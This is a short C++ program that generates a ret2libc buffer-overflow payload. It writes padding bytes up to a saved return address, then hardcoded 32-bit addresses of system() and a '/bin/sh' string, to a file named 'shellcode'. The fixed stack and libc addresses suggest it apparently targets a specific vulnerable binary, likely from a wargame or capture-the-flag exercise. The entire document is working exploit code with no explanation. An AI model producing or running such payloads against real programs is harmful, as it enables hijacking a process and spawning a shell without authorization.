#include <iostream>
#include <fstream>
#include <sstream>

typedef unsigned int uint;

uint eip = 0xffffd60c;
uint bufferAddr = 0xffffd570;
uint padding = eip - bufferAddr;
uint addr_system = 0xf7e6aed0;
uint addr_binsh = 0xf7f897ec;

int writeShellCode()
{
	std::ofstream file("shellcode");

	for (uint i = 0; i < padding; i++)
		file << (char)'A';

	for (int i = 0; i < 4; i++)
		file << ((char *)(&addr_system))[i];

	file << "OSEF";

	for (int i = 0; i < 4; i++)
		file << ((char *)(&addr_binsh))[i];

	file << '\n';
	file.close();
	return 1;
}

int main(int argc, char const *argv[])
{
	writeShellCode();
	return 0;
}
